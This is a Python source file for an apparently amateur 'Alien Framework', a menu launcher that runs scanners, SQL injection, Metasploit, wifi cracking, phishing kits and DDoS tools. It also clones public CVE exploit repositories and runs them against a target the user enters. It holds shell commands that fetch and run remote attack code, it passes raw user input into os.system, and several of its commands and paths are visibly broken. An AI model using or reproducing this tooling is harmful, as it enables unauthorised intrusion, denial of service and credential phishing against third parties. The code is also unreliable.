import sys, os
import urllib
import time
import webbrowser
import colorama
from colorama import Fore, Style
print(Fore.RED + "")
class color:
    HEADER = '\033[0m'
exploitfrompack2 = color.HEADER + '''
cve-2016-10033
cve-2017-3169
cve-2017-7269
cve-2017-7269-2
cve-2017-7679
cve-2017-8295
cve-2017-9798
cve-2017-9805
cve-2017-10271
cve-2017-12617
cve-2017-15412
cve-2018-7600
cve-2019-6340
cve-2017-5638
cve-2018-10933
cve-2017-3599
'''
warnscan = color.HEADER + '''
  ▒█████░    ▓████▒   ▒████▓   ██░████
 ████████   ███████   ██████▓  ███████▓
 ██▒  ░▒█  ▓██▒  ▒█   █▒  ▒██  ███  ▒██
 █████▓░   ██░         ▒█████  ██    ██
 ░██████▒  ██        ░███████  ██    ██
    ░▒▓██  ██░       ██▓░  ██  ██    ██
 █▒░  ▒██  ▓██▒  ░█  ██▒  ███  ██    ██
 ████████   ███████  ████████  ██    ██
 ░▓████▓     ▓████▒   ▓███░██  ██    ██'''
warnvulner = color.HEADER + '''

                     ████
                     ████
                       ██
 ██▒  ▒██  ██    ██    ██      ██░████    ░████▒    ██░████   ▒█████░
 ▓██  ██▓  ██    ██    ██      ███████▓  ░██████▒   ███████  ████████
 ▒██  ██▒  ██    ██    ██      ███  ▒██  ██▒  ▒██   ███░     ██▒  ░▒█
  ██░░██   ██    ██    ██      ██    ██  ████████   ██       █████▓░
  ██▒▒██   ██    ██    ██      ██    ██  ████████   ██       ░██████▒
  ▒████▒   ██    ██    ██      ██    ██  ██         ██          ░▒▓██
   ████    ██▒  ███    ██▒     ██    ██  ███░  ▒█   ██       █▒░  ▒██
   ████    ▓███████    █████   ██    ██  ░███████   ██       ████████
   ▒██▒     ▓███░██    ░████   ██    ██   ░█████▒   ██       ░▓████▓'''
warnsql = color.HEADER + '''

  ▒████▒    ░████░   ██
 ▒██████    ██████   ██
 ██▒  ▒█   ▒██  ██▒  ██
 ██        ██▒  ▒██  ██
 ███▒      ██    ██  ██
 ▒█████▒   ██    ██  ██
  ░█████▒  ██    ██  ██
     ▒███  ██    ██  ██
       ██  ██▒  ▒██  ██
 █▒░  ▒██  ▒██  ██▓  ██
 ███████▒   ██████░  ████████
 ░█████▒    ░█████   ████████
               ░██▒
                ░█'''
warnexploit = color.HEADER + '''

                                                      ██
 ████████                      ████                   ██
 ████████                      ████                   ██       ██
 ██                              ██                            ██
 ██        ███  ███  ██░███▒     ██       ░████░    ████     ███████    ▒█████░
 ██         ██▒▒██   ███████▒    ██      ░██████░   ████     ███████   ████████
 ███████    ▒████▒   ███  ███    ██      ███  ███     ██       ██      ██▒  ░▒█
 ███████     ████    ██░  ░██    ██      ██░  ░██     ██       ██      █████▓░
 ██          ▒██▒    ██    ██    ██      ██    ██     ██       ██      ░██████▒
 ██          ████    ██░  ░██    ██      ██░  ░██     ██       ██         ░▒▓██
 ██         ▒████▒   ███  ███    ██▒     ███  ███     ██       ██░     █▒░  ▒██
 ████████   ██▒▒██   ███████▒    █████   ░██████░  ████████    █████   ████████
 ████████  ███  ███  ██░███▒     ░████    ░████░   ████████    ░████   ░▓████▓
                     ██
                     ██
                     ██'''
warnwifi = color.HEADER + '''


              ██                  ██
██      ██    ██       ▒████      ██
██░    ░██    ██       █████      ██
██▒    ▒██             ██
▓█▒ ██ ▒█▓  ████     ███████    ████
▒█▓░██ ██▒  ████     ███████    ████
▒██░██░██▒    ██       ██         ██
░██▒██▒██░    ██       ██         ██
 ██▓▓▓▓██░    ██       ██         ██
 ███▒▒███     ██       ██         ██
 ███░░███     ██       ██         ██
 ███  ███  ████████    ██      ████████
 ▓██  ███  ████████    ██      ████████'''
warnddos = color.HEADER + '''
 █████▒    █████▒               ▒████▒
 ███████   ███████             ▒██████
 ██  ▒██▒  ██  ▒██▒            ██▒  ▒█
 ██   ▒██  ██   ▒██   ░████░   ██
 ██   ░██  ██   ░██  ░██████░  ███▒
 ██    ██  ██    ██  ███  ███  ▒█████▒
 ██    ██  ██    ██  ██░  ░██   ░█████▒
 ██   ░██  ██   ░██  ██    ██      ▒███
 ██   ▒██  ██   ▒██  ██░  ░██        ██
 ██  ▒██▒  ██  ▒██▒  ███  ███  █▒░  ▒██
 ███████   ███████   ░██████░  ███████▒
 █████▒    █████▒     ░████░   ░█████▒'''
warnapach = color.HEADER + '''

   ▒██▒                                  ██
   ▓██▓                                  ██
   ████                                  ██
   ████    ██░███▒    ▒████▓     ▓████▒  ██░████    ░████▒
  ▒█▓▓█▒   ███████▒   ██████▓   ███████  ███████▓  ░██████▒
  ▓█▒▒█▓   ███  ███   █▒  ▒██  ▓██▒  ▒█  ███  ▒██  ██▒  ▒██
  ██  ██   ██░  ░██    ▒█████  ██░       ██    ██  ████████
  ██████   ██    ██  ░███████  ██        ██    ██  ████████
 ░██████░  ██░  ░██  ██▓░  ██  ██░       ██    ██  ██
 ▒██  ██▒  ███  ███  ██▒  ███  ▓██▒  ░█  ██    ██  ███░  ▒█
 ███  ███  ███████▒  ████████   ███████  ██    ██  ░███████
 ██▒  ▒██  ██░███▒    ▓███░██    ▓████▒  ██    ██   ░█████▒
           ██
           ██
           ██'''
warnsocial = color.HEADER + '''
                                  ██
  ▒████▒                          ██               ████
 ▒██████                          ██               ████
 ██▒  ▒█                                             ██
 ██         ░████░     ▓████▒   ████      ▒████▓     ██
 ███▒      ░██████░   ███████   ████      ██████▓    ██
 ▒█████▒   ███  ███  ▓██▒  ▒█     ██      █▒  ▒██    ██
  ░█████▒  ██░  ░██  ██░          ██       ▒█████    ██
     ▒███  ██    ██  ██           ██     ░███████    ██
       ██  ██░  ░██  ██░          ██     ██▓░  ██    ██
 █▒░  ▒██  ███  ███  ▓██▒  ░█     ██     ██▒  ███    ██▒
 ███████▒  ░██████░   ███████  ████████  ████████    █████
 ░█████▒    ░████░     ▓████▒  ████████   ▓███░██    ░████
'''
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble a")
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble al")
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble ali")
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble alie")
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble alien")
print("      Framework")
time.sleep(2)
os.system("clear")


class color:
    HEADER = '\033[0m'



logo = color.HEADER + '''
                 _     _       .      .        |"|          _   _
     ___       o' \,=./ `o   .  .:::.         _|_|_        '\\-//`
    (o o)         (o o)        :(o o):  .     (o o)         (o o)
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
            This framework is only for KALI LINUX/PARROT OS

     _______  _       _________ _______  _
    (  ___  )( \      \__   __/(  ____ \( (    /|
    | (   ) || (         ) (   | (    \/|  \  ( |
    | (___) || |         | |   | (__    |   \ | |
    |  ___  || |         | |   |  __)   | (\ \) |
    | (   ) || |         | |   | (      | | \   |
    | )   ( || (____/\___) (___| (____/\| )  \  |
    |/     \|(_______/\_______/(_______/|/    )_) Framework

            by the Alien Security Brokers.
    

--------------------------------------------------------------------------
                   |
                   | 1. use cve-2.......
                   |
                   | 2. use tools
                   |
--------------------------------------------------------------------------                    
'''
print(logo)
time.sleep(1)
print(exploitfrompack2)
mainmeny = color.HEADER + ''' 

={ scan } Information getting.
={ vulner } Vulnerability Scanning 
={ sql } Sql injections.
={ exploit } Exploitation tools.
={ wifi } wifi cracking.
={ info } M0re information.
={ ddos } Distributed Denial of Service.
={ apache } Run the APACHE on your IP address.
={ se } Social Engineering. 
={ fun } Fun menu.
={ install } Install tools menu.
={ github } My Github accaunt.

--------------------------------

use ......

--------------------------------

use scan

use sql 

use vulner
'''
scanning = color.HEADER + '''
={ nmap } Nmap 
={ nikto } Nikto 
={ recon } Recon-ng 
={ zen } Zenmap

=================================

use ...

=================================
'''
vulnerebility = color.HEADER + '''
={ golismero } Golismero
={ lynis } Lynis

=================================

use ...

=================================
'''
database = color.HEADER + '''
={ sqlmap } SQLMAP 
={ jsql } jsql (parrotOS)

=================================

use ...

=================================
'''
exploittools = color.HEADER + '''
={ metasploit } Metasploit
={ cve } CVE Exploits 
={ beef } Start BeEF
={ armitage } Start Armitage
={ ghostp } Start Ghost Phisher

=================================

use ...

=================================
'''
wificracking = color.HEADER + '''
={ wifite } Wifite

=================================

use ...

=================================
'''
theend = color.HEADER + '''
 __                 __             __
|  |_.-----.-----. |  |--.---.-.--|  |
|   _|  _  |  _  | |  _  |  _  |  _  |
|____|_____|_____| |_____|___._|_____|
 '''
informationboard = color.HEADER + '''

                 _     _       .      .        |"|          _   _
     ___       o' \,=./ `o   .  .:::.         _|_|_        '\\-//`
    (o o)         (o o)        :(o o):  .     (o o)         (o o)
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-


 _______  _       _________ _______  _
(  ___  )( \      \__   __/(  ____ \( (    /|
| (   ) || (         ) (   | (    \/|  \  ( |
| (___) || |         | |   | (__    |   \ | |
|  ___  || |         | |   |  __)   | (\ \) |
| (   ) || |         | |   | (      | | \   |
| )   ( || (____/\___) (___| (____/\| )  \  |
|/     \|(_______/\_______/(_______/|/    )_) Framework

            by the ąƖıɛŋ ʂɛƈųrıɬყ.


Contact us:
0000000000000000000000000000000000000000000000000000000

MAIL: aliensecurity@yandex.ru
SOCIALMIDEAS: https://vk.com/eternalbluehack
              https://twitter.com/isitahacker
              https://github.com/colorblindpentester
              
0000000000000000000000000000000000000000000000000000000

FAQ:       
1 How to join our team?
    -Write to me at vk.com
2 Who are us?
    -Team of hackers and coders.
3 What is this script for?
    -It will help you want to pentest.
    
                        ██
           ████         ██
           ████         ██
             ██
  ▒████▓     ██       ████      ░████▒   ██░████
  ██████▓    ██       ████     ░██████▒  ███████▓
  █▒  ▒██    ██         ██     ██▒  ▒██  ███  ▒██
   ▒█████    ██         ██     ████████  ██    ██
 ░███████    ██         ██     ████████  ██    ██
 ██▓░  ██    ██         ██     ██        ██    ██
 ██▒  ███    ██▒        ██     ███░  ▒█  ██    ██
 ████████    █████   ████████  ░███████  ██    ██
  ▓███░██    ░████   ████████   ░█████▒  ██    ██ 
    
0000000000000000000000000000000000000000000000000000000

About script:

Alien-Framework - A framework what will help you with pentesting. This script was written by the AlienSecurity.
It uses the pre-installed tools if Kali/ParrotOS to help you. Remember, this framework WONT work in other Operation
systems! The Alien Security is not responsible for all damage what was done by using this framework.

1 info getting - scanning a host/ip.
2 vulnerability scan - scanning a host/ip to find vulnerability's.
3 SQL injections - tools to exploit a vulnerability's in sql.
4 Exploits.... - metasploit, and some exploits...
5 Wifi cracking - wifire. (auto wifi cracking tool)
6 M0re information - this is it.
7 DDoS - to take down sites/IP's/SSL.
8 Apache run - just runs a apache on your IP.
9 Social Engineering - 0_o
10 Fun - Fun. 
11 Install tools menu - just it will install some tools.
12 My Github accaunt - ....you now what is a GitHub right?...

   |             _     _
   |.===.      o' \,=./ `o    `  _ ,  '
   {}o o{}        (o o)      -  (o)o)  -
ooO--(_)--Ooo-ooO--(_)--Ooo--ooO'(_)--Ooo- 
'''
ddosatt = color.HEADER + '''
={ thcssl } THC-SSL-DOS. (Parrot OS)
={ memcrashed } Memcrashed-DDoS-Exploit.
={ ufonet } UfoNet.

=================================

use ...

=================================
'''
setools = color.HEADER + '''
={ set } Social Engineering ToolKit.
={ ghostp } Ghost-Phisher.
={ socialfish } SocialFish

=================================

use ...

=================================
'''
fffun = color.HEADER + '''
={ figlet } Figlet.
={ logo } print logo.

=================================

use ...

=================================
'''
exploitfrompack = color.HEADER + '''
={ 1 } CVE-2016-10033
={ 2 } CVE-2017-3169
={ 3 } CVE-2017-7269
={ 4 } CVE-2017-7269-2
={ 5 } CVE-2017-7679
={ 6 } CVE-2017-8295
={ 7 } CVE-2017-9798
={ 8 } CVE-2017-9805
={ 9 } CVE-2017-10271
={ 10 } CVE-2017-12617
={ 11 } CVE-2017-15412
={ 12 } CVE-2018-7600
={ 13 } CVE-2019-6340
={ 14 } CVE-2017-5638

'''
toolstoinstall = color.HEADER + '''
                              ████
   ██                          ████
   ██                            ██
 ███████    ░████░    ░████░     ██       ▒█████░
 ███████   ░██████░  ░██████░    ██      ████████
   ██      ███  ███  ███  ███    ██      ██▒  ░▒█
   ██      ██░  ░██  ██░  ░██    ██      █████▓░
   ██      ██    ██  ██    ██    ██      ░██████▒
   ██      ██░  ░██  ██░  ░██    ██         ░▒▓██
   ██░     ███  ███  ███  ███    ██▒     █▒░  ▒██
   █████   ░██████░  ░██████░    █████   ████████
   ░████    ░████░    ░████░     ░████   ░▓████▓
   
={ lazy } Install a Lazy Script.
={ ddos2 } Install some DDoS Tools.
={ toilet } Install toilet.
={ cmatrix } Install cmatrix.
={ cve2 } Install Some more CVE Exploits. (I will add it to "Exploits" menu)
={ crashcast } Install CrashCast-Exploits.

=================================

install ...

=================================
'''

alien12 = input("\033[1;31;40m <AlienConsole ==>> ")
if alien12 =="use tools":
    os.system("clear")
    print(mainmeny)
    aliensec = input("\033[1;31;40m <AlienConsole ==>> ")
    if aliensec =="use scan":
        print(warnscan)
        print(scanning)
        scanningstart = input("\033[1;31;40m <AlienConsole ==>> ")
        if scanningstart =="use nmap":
            os.system("clear")
            os.system("figlet NMAP SCAN")
            host = input("Enter a target: ")
            os.system("nmap -A -Pn %s" % host)
            print(Fore.WHITE + "Done.")
        if scanningstart =="use nikto":
            os.system("clear")
            os.system("figlet NIKTO SCAN")
            niktohost = input("Enter a target: ")
            niktoport = input("Enter a port to scan: ")
            os.system("nikto -host %s -p %s" % (niktohost, niktoport))
            print(Fore.WHITE + "Done.")
        if scanningstart =="use recon":
            os.system("clear")
            os.system("figlet RECON-NG")
        if scanningstart =="use zen":
            os.system("clear")
            os.system("zenmap")
            print(Fore.WHITE + "Done.")
    if aliensec =="use vulner":
        print(warnvulner)
        print(vulnerebility)
        vulnerstart = input("\033[1;31;40m <AlienConsole ==>> ")
        if vulnerstart =="use golismero":
            os.system("clear")
            os.system("figlet GOLISMERO")
            golishost = input("Input a target here: ")
            os.system("golismero -scan %s" % golishost)
            print(Fore.WHITE + "Done.")
        if vulnerstart =="use lynis":
            os.system("clear")
            os.system("figlet Lynis")
            os.system("lynis audit system")
            print(Fore.WHITE + "Done.")
    if aliensec =="use sql":
        print(warnsql)
        print(database)
        datatool = input("\033[1;31;40m <AlienConsole ==>> ")
        if datatool =="use sqlmap":
            os.system("clear")
            os.system("figlet sqlmap")
            sqltarget = input("<AlienConsole> Enter a target to exploit: ")
            os.system("sqlmap -u %s --random-agent --dbs" % sqltarget )
            print(Fore.WHITE + "Done.")
        if datatool =="use jsql":
            os.system("clear")
            os.system("figlet jsql")
            os.system("jsql")
            print(Fore.WHITE + "Done.")
    if aliensec =="use exploit":
        print(warnvulner)
        print(exploittools)
        exploitsss = input("\033[1;31;40m <AlienConsole ==>> ")
        if exploitsss =="use metasploit":
            os.system("msfconsole")
            print(Fore.WHITE + "Done.")
        if exploitsss =="use beef":
            os.system("clear")
            os.system("figlet BeEF")
            os.system("beef-xss")
    if aliensec =="use wifi":
        print(warnwifi)
        print(wificracking)
        wcrack = input("\033[1;31;40m <AlienConsole ==>> ")
        if wcrack =="use wifite":
            os.system("clear")
            os.system("figlet WIFITE")
            os.system("wifite")
    if aliensec =="use info":
        os.system("clear")
        os.system("figlet info")
        print(informationboard)
    if aliensec =="use ddos":
        print(warnddos)
        print(ddosatt)
        dtools = input("\033[1;31;40m <AlienConsole ==>> ")
        if dtools =="use memcrashed":
            os.system("clear")
            os.system("figlet Memcrashed")
            os.system("git clone https://github.com/649/Memcrashed-DDoS-Exploit maf123")
            os.system("cd maf123 && python3 Memcrashed.py")
        if dtools =="use thcsll":
            os.system("clear")
            os.system("figlet SSL-DOS")
            sslip = input("<AlienConsole> Enter a target's IP address: ")
            sslport = input("<AlienConsole> Enter a SSL port to attack on: ")
            os.system("thc-ssl-dos %s %s --accept" % (sslip, sslport))
        if dtools =="ufonet":
            os.system("clear")
            os.system("figlet ufonet")
            os.system("git clone https://code.03c8.net/epsylon/ufonet ufoalienF")
            os.system("cd ufoalienF")
            os.system("./ufonet")
    if aliensec =="use apache":
        os.system("clear")
        print(warnapach)
        os.system("sudo service apache2 start")
    if aliensec =="use se":
        os.system("clear")
        print(warnsocial)
        print("<AlienConsole> Wait a little bit...")
        time.sleep(1)
        print(setools)
        socialgayscripts = input("\033[1;31;40m <AlienConsole ==>> ")
        if socialgayscripts =="use set":
            os.system("clear")
            os.system("figlet SET")
            os.system("setoolkit")
        if socialgayscripts =="use ghostp":
            os.system("clear")
            os.system("figlet GhostP")
            os.system("ghost-phisher")
        if socialgayscripts =="use socialfish":
            os.system("clear")
            os.system("figlet SocialFish")
            os.system("git clone https://github.com/UndeadSec/SocialFish sffaf")
            os.system("cd sffaf && python3 SocialFish root toor")
            os.system("pip3 install -r requirements.txt")
            os.system("python3 SocialFish.py")
    if aliensec =="use fun":
        print(fffun)
        ffuma = input("\033[1;31;40m <AlienConsole ==>> ")
        if ffuma =="use figlet":
            os.system("clear")
            os.system("figlet FIGLET")
            figlettext = input("What do you want to write? ")
            figletfont = input("Choose a font: ")
            os.system("figlet -f %s %s" % (figletfont, figlettext))
        if ffuma =="use logo":
            os.system("clear")
            print(logo)
    if aliensec =="use install":
        os.system("clear")
        print(toolstoinstall)
        intools = input("\033[1;31;40m <AlienConsole ==>> ")
        if intools =="install lazy":
            os.system("clear")
            os.system("cd")
            os.system("git clone https://github.com/arismelachroinos/lscript.git")
            os.system("cd lscript")
            os.system("chmod +x install.sh")
            os.system("./install.sh")
            print("Wait until install will stop, and start lazy script by typing 'l' in term.")
        if intools =="install ddos2":
            print("Well, lets install Saddam")
            os.system("cd")
            os.system("git clone https://github.com/OffensivePython/Saddam")
            os.system("cd Saddam")
            print("done!")
            time.sleep(2)
            os.system("clear")
            print("ok Saddam is done. Lets install Saint-Attacker!")
            os.system("cd")
            os.system("git clone https://github.com/colorblindpentester/Saint-Attacker")
            os.system("cd Saint-Attacker")
            print("Now wait until other tools will be installed")
            time.sleep(2)
            os.system("clear")
            os.system("cd")
            print("Now i am going to install hammer.")
            os.system("git clone https://github.com/cyweb/hammer")
            print(Fore.WHITE + "Done.")
            time.sleep(2)
            os.system("clear")
            print(Fore.WHITE + "Done.")
        if intools =="install toilet":
            os.system("clear")
            os.system("apt-get install toilet")
            print(Fore.WHITE + "Done.")
        if intools =="install cmatrix":
            os.system("clear")
            os.system("apt-get install cmatrix")
            print("to start: cmatrix")
            print(Fore.WHITE + "Done.")
        if intools =="install cve2":
            os.system("clear")
            os.system("git clone https://github.com/lcashdol/Exploits alienexploits")
            os.system("cd alienexploits && ls")
            print(Fore.WHITE + "Done.")
            print("Done.")
        if intools =="install crashcast":
            os.system("clear")
            os.system("cd && git clone https://github.com/649/Crashcast-Exploit && cd Crashcast-Exploit && ls")
            print(Fore.WHITE + "Done.")
    if aliensec =="use github":
        os.system("clear")
        print("\033[1;31;40m <AlienConsole ==>> Welcome!")
        webbrowser.open_new_tab("https://github.com/colorblindpentester")
if alien12 =="use cve-2016-10033": #доделать блять
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    print("CVE-2016-10033")
    os.system("cd CVEALIEN && cd CVE-2016-10033 && perl CVE_2016_10033.pl %s " % targeturl)
if alien12 =="use cve-2017-3169":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    print("CVE-2017-3169")
    os.system("cd CVEALIEN && cd CVE-2017-3169 && perl CVE_2017_3169.pl %s --apache-dir %s" % (targeturl, apachedir))
if alien12 =="use cve-2017-7269":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    print("CVE-2017-7269")
    install = input("Install it? y/n: ")
    if install == "y":
        print("installing")
        os.system("cd CVEALIEN && cd CVE-2017-7269 && chmod +x install.sh && ./install.sh")
    if install == "n":
        print("Launching...")
        time.sleep(1)
        os.system("perl CVE_2017_7269.pl %s %s" % (targeturl, apachedir))
if alien12 =="use cve-2017-7269-2":
    print("not done yet.")
if alien12 =="use cve-2017-7679":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    os.system("cd CVEALIEN cd CVE-2017-7679 && perl CVE_2017_7679.pl %s %s" % (targeturl, apachedir))
if alien12 =="cve-2017-8295":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    os.system("cd CVEALIEN cd CVE-2017-8295 && perl CVE_2017_8295.pl %s " % targeturl)
if alien12 =="use cve-2017-9798":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    os.system("cd CVEALIEN cd CVE-2017-9798 && perl reproducel.pl %s " % targeturl)
if alien12 =="use cve-2017-9798":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    istall232 = input("Install? y/n: ")
    if istall232 == "y":
        os.system("clear")
        os.system("figlet Installing...")
        os.system("cd CVEALIEN cd CVE-2017-9805 && chmod +x install.sh && ./install.sh && cd")
    if istall232 == "n":
        os.system("clear")
        os.system("figlet CVE-EXPLOIT")
        os.system("cd CVEALIEN cd CVE-2017-9798 && perl CVE_2017_9798.pl %s " % targeturl)
if alien12 =="use cve-2017-10271":
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    os.system("cd CVE-2017-10271")
    print("Sorry... It is still not done... I will fix it... Maybe...")
if alien12 =="use cve-2017-12617":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    os.system("cd CVEALIEN && cd CVE-2017-12617 && perl CVE_2017_12617.pl %s " % targeturl)
if alien12 =="use cve-2017-15412":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    istall2322 = input("Install first? y/n: ")
    if istall2322 == "y":
        os.system("clear")
        os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
        os.system("cd CVEALIEN")
        os.system("clear")
        os.system("figlet Installing...")
        os.system("cd CVEALIEN cd CVE-2017-15412 && chmod +x install.sh && ./install.sh && cd")
    if istall2322 == "n":
        os.system("clear")
        os.system("figlet CVE-EXPLOIT")
        os.system("cd CVEALIEN && cd CVE-2017-15412 && perl CVE_2017_15412.pl %s" % targeturl)
if alien12 =="use cve-2018-7600":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    istall23222 = input("Install first? y/n: ")
    if istall23222 == "y":
        os.system("clear")
        os.system("figlet Installing...")
        os.system("cd CVEALIEN cd CVE-2018-7600 && chmod +x install.sh && ./install.sh && cd")
    if istall23222 == "n":
        os.system("clear")
        os.system("figlet CVE-EXPLOIT")
        os.system("cd CVEALIEN && cd CVE-2018-7600 && perl CVE_2018_7600.pl %s" % targeturl)
if alien12 =="use cve-2019-6340":
    istall232222 = input("Install first? y/n: ")
    if istall232222 == "y":
        os.system("clear")
        os.system("figlet Installing...")
        os.system("cd CVEALIEN cd CVE-2019-6340 && chmod +x install.sh && ./install.sh && cd")
    if istall232222 == "n":
        os.system("clear")
        os.system("figlet CVE-EXPLOIT")
        os.system("cd CVEALIEN && cd CVE-2019-6340 && perl CVE_2019_6340.pl %s" % targeturl)
if alien12 =="use cve-2017-5638":
    os.system("clear")
    os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
    os.system("cd CVEALIEN")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    apachedir = input("<AlienConsole> Enter a apache install path: ")
    os.system("clear")
    os.system("clear")
    os.system("figlet CVE-EXPLOIT")
    os.system("git clone https://github.com/colorblindpentester/CVE-2017-5638 CVEaliensec2 && cd CVEaliensec2")
    os.system("python2 struts2_S2-045.py %s" % targeturl)
if alien12 =="use cve-2018-10933":
    os.system("clear")
    os.system("git clone https://github.com/SoledaD208/CVE-2018-10933 cvealien2ssh")
    os.system("cd vealien2ssh")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    targetport = input("<AlienConsole> Enter a ssh port: ")
    installsshexploit = input("Install y/n: ")
    if installsshexploit =="y":
        os.system("pip3 install -r requirements.txt")
        os.system("python3 CVE-2018-10933.py %s -p %s" % (targeturl, targetport))
    if installsshexploit =="n":
        os.system("python3 CVE-2018-10933.py %s -p %s" % (targeturl, targetport))
if alien12 =="use cve-2017-3599":
    os.system("clear")
    os.system("git clone https://github.com/SECFORCE/CVE-2017-3599 aliensecexploit123")
    os.system("cd vealien2ssh")
    targeturl = input("<AlienConsole> Enter a URL to test: ")
    targetport = input("<AlienConsole> Enter a port: ")
    os.system("cd aliensecexploit123 && python cve-2017-3599_poc.py %s %s" % (targeturl, targetport))